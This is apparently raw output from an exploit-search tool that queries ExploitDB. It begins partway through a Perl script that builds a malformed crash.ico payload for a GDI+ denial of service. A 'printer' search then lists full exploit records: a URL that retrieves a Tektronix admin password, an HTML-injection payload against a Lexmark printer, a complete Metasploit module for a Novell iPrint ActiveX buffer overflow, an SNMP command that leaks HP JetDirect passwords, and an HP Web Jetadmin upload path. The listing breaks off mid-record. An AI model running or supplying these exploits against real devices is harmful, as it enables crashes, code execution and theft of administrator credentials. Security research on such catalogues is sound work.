\\xfe\\xfe\\xfd\\xfa\\xfe\\xfd\\xf8\\xe5\\xfe\\xfa\\xcc\\x4c".\r\n"\\xfe\\xf4\\xb4\\x05\\xfe\\xf0\\xaf\\x03\\xfe\\xea\\xab\\x05\\xfe\\xe8\\xb5\\x30\\xfe\\xf5\\xe5\\xb9".\r\n"\\xfe\\xfd\\xfb\\xf7\\xfe\\xfc\\xfb\\xf7\\xfe\\xf7\\xef\\xdf\\xfe\\xcf\\xa3\\x40\\xfe\\xba\\x81\\x05".\r\n"\\xfe\\xb4\\x7d\\x06\\xfe\\xd6\\xbc\\x86\\xfc\\xa6\\x72\\x0f\\x7e\\xa2\\x6d\\x07\\x29\\xcf\\xb2\\x7a".\r\n"\\xf7\\xdf\\xb2\\x3f\\xfd\\xf5\\xe6\\xbe\\xfe\\xfe\\xfc\\xf7\\xfe\\xfd\\xfc\\xfa\\xfe\\xfe\\xfe\\xfc".\r\n"\\xfe\\xfe\\xfd\\xf9\\xfe\\xfd\\xf1\\xcb\\xfe\\xfc\\xc5\\x28\\xfe\\xfa\\xb9\\x04\\xfe\\xf5\\xb4\\x00".\r\n"\\xfe\\xf0\\xaf\\x00\\xfe\\xeb\\xab\\x00\\xfe\\xe5\\xa6\\x02\\xfe\\xdf\\xa2\\x08\\xfe\\xe5\\xbe\\x5d".\r\n"\\xfe\\xf8\\xf0\\xde\\xfe\\xfd\\xfb\\xf7\\xfe\\xfa\\xf6\\xef\\xfe\\xd4\\xb3\\x69\\xfe\\xbd\\x8b\\x22".\r\n"\\xfe\\xcd\\xaf\\x78\\xf7\\xa4\\x70\\x0c\\x28\\x79\\x50\\x03\\x03\\xaa\\x7b\\x20\\xaa\\xf3\\xeb\\xd9".\r\n"\\xfc\\xf5\\xe7\\xc2\\xfd\\xf7\\xea\\xc4\\xfe\\xf9\\xeb\\xc4\\xfe\\xfa\\xec\\xc4\\xfe\\xfa\\xe1\\x98".\r\n"\\xfe\\xfa\\xbc\\x11\\xfe\\xfb\\xb9\\x03\\xfe\\xf9\\xb7\\x00\\xfe\\xf5\\xb3\\x00\\xfe\\xf0\\xae\\x00".\r\n"\\xfe\\xea\\xaa\\x00\\xfe\\xe4\\xa4\\x00\\xfe\\xde\\x9f\\x01\\xfe\\xd7\\x9a\\x04\\xfe\\xd3\\x9c\\x16".\r\n"\\xfe\\xe6\\xcc\\x8f\\xfe\\xfa\\xf8\\xf1\\xfe\\xfa\\xf8\\xf3\\xfd\\xeb\\xde\\xc5\\xfc\\xab\\x7c\\x22".\r\n"\\xaa\\x87\\x5a\\x04\\x03\\x2f\\x1f\\x00\\x01\\x9f\\x6c\\x0b\\x26\\xc6\\xa6\\x67\\xf0\\xe5\\xb9\\x49".\r\n"\\xfd\\xe4\\xa7\\x0a\\xfe\\xea\\xac\\x08\\xfe\\xf0\\xb0\\x07\\xfe\\xf4\\xb3\\x04\\xfe\\xf6\\xb5\\x02".\r\n"\\xfe\\xf7\\xb5\\x00\\xfe\\xf6\\xb4\\x00\\xfe\\xf2\\xb1\\x00\\xfe\\xee\\xad\\x00\\xfe\\xe8\\xa8\\x00".\r\n"\\xfe\\xe2\\xa3\\x00\\xfe\\xdc\\x9d\\x00\\xfe\\xd5\\x98\\x00\\xfe\\xce\\x91\\x02\\xfe\\xc8\\x8d\\x06".\r\n"\\xfe\\xcd\\x9f\\x38\\xfe\\xef\\xe3\\xca\\xfc\\xc7\\xa7\\x6b\\xf0\\xa1\\x6f\\x0e\\x26\\x3e\\x28\\x00".\r\n"\\x01\\x00\\x00\\x00\\x00\\x68\\x44\\x01\\x02\\xa2\\x6f\\x0d\\x60\\xd7\\xbd\\x87\\xfa\\xe5\\xb2\\x2e".\r\n"\\xfe\\xe7\\xa7\\x03\\xfe\\xec\\xab\\x00\\xfe\\xef\\xae\\x00\\xfe\\xf2\\xb0\\x00\\xfe\\xf2\\xb1\\x00".\r\n"\\xfe\\xf1\\xb0\\x00\\xfe\\xef\\xad\\x00\\xfe\\xea\\xaa\\x00\\xfe\\xe5\\xa5\\x00\\xfe\\xe0\\xa0\\x00".\r\n"\\xfe\\xd9\\x9b\\x00\\xfe\\xd2\\x95\\x00\\xfe\\xcc\\x90\\x00\\xfe\\xc5\\x8b\\x03\\xfe\\xc9\\x9a\\x2f".\r\n"\\xfe\\xd4\\xbb\\x88\\xfa\\xa4\\x72\\x11\\x60\\x75\\x4d\\x02\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x82\\x57\\x03\\x02\\xa6\\x73\\x13\\x78\\xd7\\xbe\\x88\\xfa\\xe8\\xbb\\x43".\r\n"\\xfc\\xe6\\xa8\\x04\\xfd\\xeb\\xab\\x02\\xfe\\xec\\xac\\x00\\xfe\\xed\\xac\\x00\\xfe\\xec\\xab\\x00".\r\n"\\xfe\\xe9\\xa9\\x00\\xfe\\xe6\\xa6\\x00\\xfe\\xe1\\xa2\\x00\\xfe\\xdc\\x9d\\x00\\xfe\\xd7\\x99\\x00".\r\n"\\xfe\\xd0\\x93\\x02\\xfe\\xca\\x8e\\x04\\xfd\\xd2\\xa5\\x41\\xfc\\xd5\\xbb\\x87\\xfa\\xa7\\x75\\x16".\r\n"\\x78\\x8b\\x5d\\x05\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x83\\x57\\x03\\x02\\xa3\\x70\\x0d\\x60\\xc7\\xa5\\x65\\xf0\\xeb\\xcd\\x83".\r\n"\\xfd\\xe7\\xaf\\x1d\\xfe\\xe7\\xa8\\x05\\xfe\\xe8\\xa8\\x03\\xfe\\xe7\\xa7\\x02\\xfe\\xe5\\xa5\\x01".\r\n"\\xfe\\xe2\\xa2\\x01\\xfe\\xdd\\x9f\\x02\\xfe\\xd8\\x9b\\x03\\xfe\\xd3\\x97\\x05\\xfe\\xd1\\x9b\\x1d".\r\n"\\xfe\\xe0\\xc2\\x81\\xfc\\xc6\\xa5\\x65\\xf0\\xa3\\x71\\x11\\x60\\x8b\\x5d\\x05\\x02\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x6c\\x48\\x01\\x02\\xa0\\x6d\\x0b\\x26\\xab\\x7c\\x20\\xaa\\xcf\\xb2\\x78".\r\n"\\xf7\\xe8\\xcd\\x8a\\xfb\\xea\\xc4\\x60\\xfd\\xe4\\xb4\\x35\\xfe\\xdf\\xa7\\x15\\xfe\\xdd\\xa5\\x15".\r\n"\\xfd\\xdd\\xad\\x35\\xfe\\xe1\\xbc\\x5f\\xfc\\xe1\\xc7\\x89\\xfc\\xce\\xb1\\x78\\xf7\\xab\\x7c\\x22".\r\n"\\xaa\\xa1\\x6e\\x0d\\x26\\x75\\x4d\\x02\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x35\\x23\\x00\\x01\\x82\\x57\\x04\\x03\\xa3\\x6f\\x0a\\x28\\xa5\\x71\\x0d".\r\n"\\x7e\\xb4\\x88\\x32\\xbe\\xc2\\x9d\\x57\\xe8\\xc9\\xa8\\x69\\xfb\\xc9\\xa8\\x69\\xfb\\xc2\\x9e\\x58".\r\n"\\xe8\\xb4\\x88\\x33\\xbe\\xa6\\x72\\x0f\\x7e\\xa4\\x70\\x0c\\x28\\x88\\x5b\\x04\\x03\\x3e\\x28\\x00".\r\n"\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\xf8\\x00\\x1f\\x00\\xf0\\x00\\x0f\\x00\\xe0\\x00\\x07\\x00\\xc0\\x00\\x03\\x00\\x80\\x00\\x01".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x01".\r\n"\\x00\\xc0\\x00\\x03\\x00\\xe0\\x00\\x07\\x00\\xf0\\x00\\x0f\\x00\\xf8\\x00\\x1f\\x00\\x28\\x00\\x00".\r\n"\\x00\\x10\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x01\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x40\\x04\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x05\\x03\\x00\\x01\\x40\\x2a\\x02\\x03\\x8c\\x5e\\x06\\x36\\xb4\\x89\\x36".\r\n"\\x9a\\xc1\\x9e\\x5a\\xdb\\xbf\\x99\\x52\\xf9\\xbf\\x99\\x52\\xf9\\xc1\\x9e\\x5a\\xdb\\xb4\\x89\\x37".\r\n"\\x9a\\x90\\x61\\x07\\x36\\x46\\x2f\\x02\\x03\\x06\\x03\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x07\\x05\\x00\\x01\\x6a\\x47\\x04\\x0d\\xae\\x83\\x31\\x9b\\xc4\\xa3\\x61".\r\n"\\xf9\\xb4\\x87\\x2b\\xfc\\xa7\\x70\\x03\\xfe\\xa6\\x6f\\x03\\xfe\\xa5\\x6f\\x03\\xfe\\xa3\\x6d\\x03".\r\n"\\xfe\\xb0\\x83\\x2b\\xfc\\xc2\\xa1\\x61\\xf9\\xaf\\x84\\x31\\x9b\\x71\\x4d\\x05\\x0d\\x0a\\x07\\x01".\r\n"\\x01\\x00\\x00\\x00\\x00\\x05\\x03\\x00\\x01\\x6a\\x48\\x05\\x0d\\xb6\\x90\\x45\\xc0\\xbf\\x96\\x43".\r\n"\\xfc\\xad\\x75\\x03\\xfe\\xad\\x76\\x01\\xfe\\xad\\x75\\x00\\xff\\xad\\x74\\x00\\xff\\xab\\x73\\x00".\r\n"\\xff\\xa9\\x71\\x00\\xff\\xa6\\x6f\\x01\\xfe\\xa4\\x6e\\x03\\xfe\\xb8\\x8f\\x41\\xfc\\xb6\\x8f\\x45".\r\n"\\xc0\\x73\\x4e\\x05\\x0d\\x06\\x04\\x00\\x01\\x40\\x2a\\x02\\x03\\xaf\\x85\\x34\\x9b\\xd8\\xbe\\x8a".\r\n"\\xfc\\xb4\\x7d\\x0a\\xfe\\xb6\\x7d\\x03\\xff\\xb6\\x7c\\x00\\xff\\xb6\\x7c\\x00\\xff\\xb5\\x7c\\x00".\r\n"\\xff\\xb3\\x7a\\x00\\xff\\xb0\\x78\\x01\\xff\\xae\\x76\\x04\\xff\\xaa\\x75\\x08\\xff\\xa8\\x73\\x0b".\r\n"\\xfe\\xbb\\x93\\x48\\xfc\\xaf\\x86\\x35\\x9b\\x4a\\x31\\x02\\x03\\x8d\\x5f\\x06\\x36\\xd0\\xb2\\x77".\r\n"\\xf9\\xf0\\xe5\\xcd\\xfe\\xeb\\xdc\\xbc\\xff\\xcb\\x9d\\x36\\xff\\xc1\\x88\\x05\\xff\\xc1\\x86\\x02".\r\n"\\xff\\xc0\\x85\\x00\\xff\\xbd\\x83\\x02\\xff\\xba\\x82\\x06\\xff\\xd4\\xb5\\x73\\xff\\xf4\\xed\\xe0".\r\n"\\xff\\xf3\\xed\\xe0\\xff\\xf1\\xe8\\xd9\\xfe\\xd3\\xbc\\x8f\\xf9\\x94\\x64\\x09\\x36\\xb5\\x8a\\x36".\r\n"\\x9a\\xc5\\x96\\x2f\\xfc\\xc6\\x90\\x19\\xfe\\xed\\xdc\\xb4\\xff\\xfb\\xf7\\xef\\xff\\xe7\\xce\\x94".\r\n"\\xff\\xd0\\x9a\\x1a\\xff\\xcb\\x91\\x07\\xff\\xca\\x94\\x13\\xff\\xe8\\xd3\\xa4\\xff\\xfc\\xfb\\xf7".\r\n"\\xff\\xfd\\xfb\\xf8\\xff\\xf2\\xea\\xd8\\xff\\xbd\\x94\\x3f\\xfe\\xb4\\x87\\x2f\\xfc\\xb4\\x8a\\x39".\r\n"\\x9a\\xc5\\xa2\\x5b\\xdb\\xc1\\x87\\x03\\xfe\\xc8\\x8d\\x03\\xff\\xd0\\x97\\x0b\\xff\\xec\\xd1\\x91".\r\n"\\xff\\xfc\\xf9\\xf3\\xff\\xf9\\xf3\\xe3\\xff\\xe6\\xc7\\x78\\xff\\xf4\\xe9\\xcd\\xff\\xfd\\xfc\\xf8".\r\n"\\xff\\xfd\\xfb\\xf7\\xff\\xe9\\xd6\\xab\\xff\\xbd\\x88\\x18\\xff\\xaf\\x78\\x04\\xff\\xa8\\x72\\x04".\r\n"\\xfe\\xc2\\x9f\\x5b\\xdb\\xc8\\xa3\\x53\\xf9\\xc8\\x8d\\x03\\xfe\\xcf\\x93\\x00\\xff\\xd8\\x9a\\x01".\r\n"\\xff\\xde\\xa1\\x08\\xff\\xed\\xca\\x6d\\xff\\xfd\\xfb\\xf5\\xff\\xfe\\xfd\\xfc\\xff\\xfe\\xfe\\xfc".\r\n"\\xff\\xfc\\xfa\\xf4\\xff\\xe2\\xc2\\x72\\xff\\xc5\\x8c\\x08\\xff\\xbb\\x82\\x02\\xff\\xb3\\x79\\x00".\r\n"\\xff\\xac\\x74\\x03\\xfe\\xc0\\x9a\\x53\\xf9\\xca\\xa5\\x54\\xf9\\xce\\x92\\x03\\xfe\\xd7\\x9a\\x00".\r\n"\\xff\\xe0\\xa1\\x02\\xff\\xe6\\xaa\\x0c\\xff\\xf4\\xd6\\x89\\xff\\xfd\\xfc\\xf8\\xff\\xfe\\xfe\\xfc".\r\n"\\xff\\xfe\\xfe\\xfc\\xff\\xfd\\xfb\\xf7\\xff\\xe7\\xc9\\x7f\\xff\\xcb\\x91\\x09\\xff\\xc0\\x85\\x02".\r\n"\\xff\\xb6\\x7d\\x00\\xff\\xaf\\x76\\x03\\xfe\\xc1\\x9b\\x53\\xf9\\xc8\\xa4\\x5c\\xdb\\xd2\\x97\\x04".\r\n"\\xfe\\xdd\\x9f\\x04\\xff\\xe8\\xb2\\x25\\xff\\xf9\\xea\\xbf\\xff\\xfe\\xfc\\xf8\\xff\\xfe\\xfc\\xf8".\r\n"\\xff\\xfa\\xea\\xbe\\xff\\xf3\\xcf\\x6f\\xff\\xfb\\xf4\\xe2\\xff\\xfd\\xfa\\xf4\\xff\\xec\\xd7\\xa7".\r\n"\\xff\\xc7\\x91\\x13\\xff\\xba\\x80\\x03\\xff\\xb1\\x79\\x04\\xfe\\xc3\\xa0\\x5c\\xdb\\xb6\\x8b\\x38".\r\n"\\x9a\\xdb\\xaa\\x32\\xfc\\xe9\\xbe\\x54\\xfe\\xfc\\xf5\\xe5\\xff\\xfe\\xfc\\xf8\\xff\\xfd\\xfb\\xf6".\r\n"\\xff\\xfc\\xe1\\x91\\xff\\xf6\\xb8\\x0d\\xff\\xef\\xb0\\x06\\xff\\xe8\\xaf\\x19\\xff\\xf0\\xd6\\x96".\r\n"\\xff\\xfb\\xf8\\xf0\\xff\\xf1\\xe5\\xca\\xff\\xc5\\x95\\x2a\\xfe\\xc0\\x91\\x2f\\xfc\\xb6\\x8b\\x39".\r\n"\\x9a\\x91\\x62\\x08\\x36\\xdf\\xc9\\x98\\xf9\\xf7\\xec\\xcf\\xfe\\xfa\\xf0\\xd3\\xff\\xfc\\xf1\\xd2".\r\n"\\xff\\xfb\\xd3\\x60\\xff\\xfb\\xba\\x06\\xff\\xf6\\xb5\\x01\\xff\\xef\\xad\\x00\\xff\\xe6\\xa6\\x02".\r\n"\\xff\\xdc\\xa0\\x05\\xff\\xdb\\xad\\x3b\\xff\\xf1\\xe4\\xc3\\xff\\xf5\\xee\\xdf\\xfe\\xd3\\xb8\\x82".\r\n"\\xf9\\x97\\x67\\x0a\\x36\\x46\\x2f\\x02\\x03\\xb0\\x86\\x34\\x9b\\xe3\\xb9\\x4a\\xfc\\xe8\\xab\\x0a".\r\n"\\xfe\\xf0\\xb1\\x07\\xff\\xf4\\xb4\\x03\\xff\\xf6\\xb5\\x01\\xff\\xf2\\xb1\\x00\\xff\\xec\\xab\\x00".\r\n"\\xff\\xe3\\xa3\\x00\\xff\\xda\\x9c\\x00\\xff\\xd0\\x94\\x04\\xff\\xc8\\x8f\\x0b\\xfe\\xe0\\xc8\\x93".\r\n"\\xfc\\xb1\\x88\\x38\\x9b\\x50\\x36\\x03\\x03\\x06\\x03\\x00\\x01\\x72\\x4d\\x05\\x0d\\xbb\\x94\\x46".\r\n"\\xc0\\xe6\\xb8\\x44\\xfc\\xe9\\xa9\\x03\\xfe\\xed\\xad\\x01\\xfe\\xee\\xae\\x00\\xff\\xeb\\xab\\x00".\r\n"\\xff\\xe6\\xa6\\x00\\xff\\xdf\\xa0\\x00\\xff\\xd6\\x98\\x01\\xfe\\xcc\\x91\\x03\\xfe\\xd0\\xa6\\x44".\r\n"\\xfc\\xb9\\x93\\x48\\xc0\\x7a\\x53\\x08\\x0d\\x08\\x05\\x00\\x01\\x00\\x00\\x00\\x00\\x0a\\x07\\x01".\r\n"\\x01\\x74\\x4e\\x05\\x0d\\xb1\\x86\\x32\\x9b\\xdc\\xb9\\x64\\xf9\\xe7\\xb4\\x2e\\xfc\\xe5\\xa6\\x03".\r\n"\\xfe\\xe3\\xa4\\x03\\xfe\\xde\\xa0\\x03\\xfe\\xd7\\x9a\\x03\\xfe\\xd7\\xa5\\x2d\\xfc\\xd2\\xb0\\x63".\r\n"\\xf9\\xb1\\x87\\x34\\x9b\\x7a\\x53\\x07\\x0d\\x0d\\x09\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x06\\x04\\x00\\x01\\x4a\\x31\\x02\\x03\\x96\\x65\\x08\\x36\\xb7\\x8c\\x39".\r\n"\\x9a\\xcb\\xa8\\x5e\\xdb\\xd0\\xaa\\x55\\xf9\\xcf\\xa9\\x55\\xf9\\xca\\xa7\\x5e\\xdb\\xb7\\x8c\\x3a".\r\n"\\x9a\\x98\\x67\\x0a\\x36\\x50\\x36\\x03\\x03\\x08\\x05\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\xc0\\x03\\x00\\x00\\x80\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x01\\x00".\r\n"\\x00\\xc0\\x03\\x00\\x00\\x00";\r\n\r\n\r\nopen(out, "> crash.ico");\r\nbinmode(out);\r\nprint (out $icofile);\r\nclose(out);\r\n\r\n=====\r\n\r\n5)Credits\r\n\r\n=====\r\n\r\nlaurent gaffi\xc3\xa9\r\n\r\nlaurent.gaffie{remove_this}[at]gmail[dot]com\r\n\r\n# milw0rm.com [2008-09-26]', u'description': u"Microsoft Windows - GDI+ '.ICO' Remote Division By Zero", u'platform': u'windows', u'author': u'laurent gaffi\xc3\xa9', u'cve': [], u'source': u'ExploitDB', u'date': u'2008-09-26T00:00:00+00:00', u'_id': 6588, u'type': u'dos', u'port': 0}

Searching for printer
=================================================================================
exploit search
=================================================================================
local
=================================================================================
Unable to parse JSON response
Searching for printer
=================================================================================
exploit search
=================================================================================
remote
=================================================================================
Exploits found: 50
CVE: []
Description: Tektronix Phaser Network Printer 740/750/750DP/840/930 PhaserLink WebServer - Retrieve Administrator Password
{u'code': u"source: http://www.securityfocus.com/bid/806/info\r\n\r\n\r\nCertain versions of the Tektronix PhaserLink printer ship with a webserver designed to help facilitate configuration of the device. This service is essentially administrator level access as it can completely modify the system characteristics, restart the machine, asign services etc.\r\n\r\nIn at least one version of this printer there are a series of undocumented URL's which will allow remote users to retrieve the administrator password. Once the password is obtained by the user, they can manipulate the printer in any way they see fit.\r\n\r\nTo obtain the administrator password:\r\n\r\nhttp://printername/ncl_items.html?SUBJECT=2097", u'description': u'Tektronix Phaser Network Printer 740/750/750DP/840/930 PhaserLink WebServer - Retrieve Administrator Password', u'platform': u'hardware', u'author': u'Dennis W. Mattison', u'cve': [], u'source': u'ExploitDB', u'date': u'1999-11-17T00:00:00+00:00', u'_id': 19632, u'type': u'remote', u'port': 0}

CVE: []
Description: Lexmark X651de - Printer Ready Message Value HTML Injection
{u'code': u'source: http://www.securityfocus.com/bid/45688/info\r\n\r\nLexmark Printer X651de is prone to an HTML-injection vulnerability because it fails to properly sanitize user-supplied input before using it in dynamically generated content.\r\n\r\nSuccessful exploits will allow attacker-supplied HTML and script code to run in the context of the affected printer web interface application, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.\r\n\r\nLexmark Printer X651de is vulnerable; other versions may also be affected. \r\n\r\nnmap --script=pjl-ready-message.nse --script-args=\'pjl_ready_message="<script>alert(1);</script>"\'', u'description': u'Lexmark X651de - Printer Ready Message Value HTML Injection', u'platform': u'hardware', u'author': u'dave b', u'cve': [], u'source': u'ExploitDB', u'date': u'2011-01-06T00:00:00+00:00', u'_id': 35170, u'type': u'remote', u'port': 0}

CVE: []
Description: Novell iPrint Client - ActiveX Control Date/Time Buffer Overflow (Metasploit)
{u'code': u'##\r\n# $Id: novelliprint_datetime.rb 9262 2010-05-09 17:45:00Z jduck $\r\n##\r\n\r\n##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# Framework web site for more information on licensing and terms of use.\r\n# http://metasploit.com/framework/\r\n##\r\n\r\nrequire \'msf/core\'\r\n\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n\tRank = GreatRanking\r\n\r\n\tinclude Msf::Exploit::Remote::HttpServer::HTML\r\n\r\n\tdef initialize(info = {})\r\n\t\tsuper(update_info(info,\r\n\t\t\t\'Name\'           => \'Novell iPrint Client ActiveX Control Date/Time Buffer Overflow\',\r\n\t\t\t\'Description\'    => %q{\r\n\t\t\t\tThis module exploits a stack buffer overflow in Novell iPrint Client 5.30. When\r\n\t\t\t\tpassing a specially crafted date/time string via certain parameters to ienipp.ocx\r\n\t\t\t\tan attacker can execute arbitrary code.\r\n\r\n\t\t\t\tNOTE: The "operation" variable must be set to a valid command in order to reach this\r\n\t\t\t\tvulnerability.\r\n\t\t\t},\r\n\t\t\t\'License\'        => MSF_LICENSE,\r\n\t\t\t\'Author\'         => [ \'jduck\' ],\r\n\t\t\t\'Version\'        => \'$Revision: 9262 $\',\r\n\t\t\t\'References\'     =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[ \'CVE\', \'2009-1569\' ],\r\n\t\t\t\t\t[ \'BID\', \'37242\' ],\r\n\t\t\t\t\t[ \'OSVDB\', \'60804\' ],\r\n\t\t\t\t\t[ \'URL\', \'http://secunia.com/advisories/35004/\' ]\r\n\t\t\t\t],\r\n\t\t\t\'DefaultOptions\' =>\r\n\t\t\t\t{\r\n\t\t\t\t\t\'EXITFUNC\' => \'process\',\r\n\t\t\t\t},\r\n\t\t\t\'Payload\'        =>\r\n\t\t\t\t{\r\n\t\t\t\t\t\'Space\'         => 512,\r\n\t\t\t\t\t\'BadChars\'      => "\\x00=:;,", # these are used in a strtok\r\n\t\t\t\t\t\'PrependEncoder\' => "\\x81\\xc4\\xf0\\xef\\xff\\xff",\r\n\t\t\t\t\t\'DisableNops\'   => true\r\n\t\t\t\t},\r\n\t\t\t\'Platform\'       => \'win\',\r\n\t\t\t\'Targets\'        =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[ \'iPrint 5.30 Windows Client\', { \'Ret\' => 0x1005ad5b } ] # jmp esp in ienipp.ocx v5.30\r\n\t\t\t\t],\r\n\t\t\t\'DisclosureDate\' => \'Dec 08 2009\',\r\n\t\t\t\'DefaultTarget\'  => 0))\r\n\tend\r\n\r\n\tdef autofilter\r\n\t\tfalse\r\n\tend\r\n\r\n\tdef check_dependencies\r\n\t\tuse_zlib\r\n\tend\r\n\r\n\tdef on_request_uri(cli, request)\r\n\t\t# Re-generate the payload.\r\n\t\treturn if ((p = regenerate_payload(cli)) == nil)\r\n\r\n\t\tsploit = "volatile-date-time"\r\n\t\tsploit << make_nops(60)\r\n\t\t# this should end up "\\xeb\\x04"\r\n\t\tsploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $+6").encode_string\r\n\t\tsploit << [target.ret].pack(\'V\')\r\n\t\tsploit << p.encoded\r\n\r\n\t\toperations = [\r\n\t\t\t"op-client-interface-version",\r\n\t\t\t"op-client-version-info",\r\n\t\t\t"op-client-is-printer-installed",\r\n\t\t\t"op-user-get-role",\r\n\t\t\t"op-printer-install",\r\n\t\t\t"op-printer-remove",\r\n\t\t\t"op-printer-get-status",\r\n\t\t\t"op-printer-get-info",\r\n\t\t\t"op-printer-pause",\r\n\t\t\t"op-printer-resume",\r\n\t\t\t"op-printer-purge-jobs",\r\n\t\t\t"op-printer-list-users-jobs",\r\n\t\t\t"op-printer-list-all-jobs",\r\n\t\t\t"op-printer-send-test-page",\r\n\t\t\t"op-printer-send-file",\r\n\t\t\t"op-printer-setup-install",\r\n\t\t\t"op-job-get-info",\r\n\t\t\t"op-job-hold",\r\n\t\t\t"op-job-release-hold",\r\n\t\t\t"op-job-cancel",\r\n\t\t\t"op-job-restart",\r\n\t\t\t"op-dbg-printer-get-all-attrs",\r\n\t\t\t"op-dbg-job-get-all-attrs"\r\n\t\t]\r\n\t\toperation = operations[rand(operations.length)]\r\n\r\n\t\t# escape single quotes\r\n\t\tsploit = xml_encode(sploit)\r\n\r\n\t\tcontent = %Q|<html>\r\n<object classid=\'clsid:36723F97-7AA0-11D4-8919-FF2D71D0D32C\'>\r\n<param name=\'operation\' value=\'#{operation}\' />\r\n<param name=\'persistence\' value=\'#{sploit}\' />\r\n</object>\r\n</html>\r\n|\r\n\r\n\t\tcontent = Rex::Text.randomize_space(content)\r\n\r\n\t\tprint_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")\r\n\r\n\t\t# Transmit the response to the client\r\n\t\tsend_response_html(cli, content)\r\n\r\n\t\t# Handle the payload\r\n\t\thandler(cli)\r\n\tend\r\n\r\n\tdef xml_encode(str)\r\n\t\tret = ""\r\n\t\tstr.unpack(\'C*\').each { |ch|\r\n\t\t\tcase ch\r\n\t\t\twhen 0x41..0x5a, 0x61..0x7a, 0x30..0x39\r\n\t\t\t\tret << ch.chr\r\n\t\t\telse\r\n\t\t\t\tret << "&#x"\r\n\t\t\t\tret << ch.chr.unpack(\'H*\')[0]\r\n\t\t\t\tret << ";"\r\n\t\t\tend\r\n\t\t}\r\n\t\tret\r\n\tend\r\n\r\nend', u'description': u'Novell iPrint Client - ActiveX Control Date/Time Buffer Overflow (Metasploit)', u'platform': u'windows', u'author': u'Metasploit', u'cve': [], u'source': u'ExploitDB', u'date': u'2010-05-09T00:00:00+00:00', u'_id': 16543, u'type': u'remote', u'port': 0}

CVE: []
Description: HP JetDirect Printer - SNMP JetAdmin Device Password Disclosure
{u'code': u'HP JetDirect J2552A/J2552B/J2591A/J3110A/J3111A/J3113A/J3263A/300.0 X Printer SNMP JetAdmin Device Password Disclosure Vulnerability\r\n\r\nsource: http://www.securityfocus.com/bid/7001/info\r\n\r\nA problem with JetDirect printers could make it possible for a remote user to gain administrative access to the printer.\r\n\r\nIt has been reported that HP JetDirect printers leak the web JetAdmin device password under some circumstances. By sending an SNMP GET request to a vulnerable printer, the printer will return the hex-encoded device password to the requester. This could allow a remote user to access and change configuration of the printer. \r\n\r\nC:\\>snmputil get example.printer public .1.3.6.1.4.1.11.2.3.9.1.1.13.0', u'description': u'HP JetDirect Printer - SNMP JetAdmin Device Password Disclosure', u'platform': u'hardware', u'author': u'Sven Pechler', u'cve': [], u'source': u'ExploitDB', u'date': u'2003-03-03T00:00:00+00:00', u'_id': 22319, u'type': u'remote', u'port': 0}

CVE: []
Description: HP Web Jetadmin 7.5.2456 - Printer Firmware Update Script Arbitrary File Upload
{u'code': u'source: http://www.securityfocus.com/bid/9971/info\r\n\r\nHP Web Jetadmin is prone to an issue which may permit remote users to upload arbitrary files to the management server. \r\n\r\nThis issue exists in the printer firmware update script. Given the ability to place arbitrary files on the server to an attacker-specified location, it may be possible to execute arbitrary code, though this will require exploitation of other known vulnerabilities, such as BID 9972 "HP Web Jetadmin setinfo.hts Script Directory Traversal Vulnerability".\r\n\r\nAuthentication, if it has been enabled, would be required to exploit this issue.\r\n\r\nThis issue was reported in HP Web Jetadmin version 7.5.2546 on a Windows platform. Other versions may be similarly affected.\r\n\r\nhttps://www.example.com:8443/plugins/hpjwja/script/devices_update_printer_fw_upload.hts', u'description': u'HP Web Jetadmin 7.5.2456 - Printer Firmware Update Script Arbitrary File Upload', u'platform': u'windows', 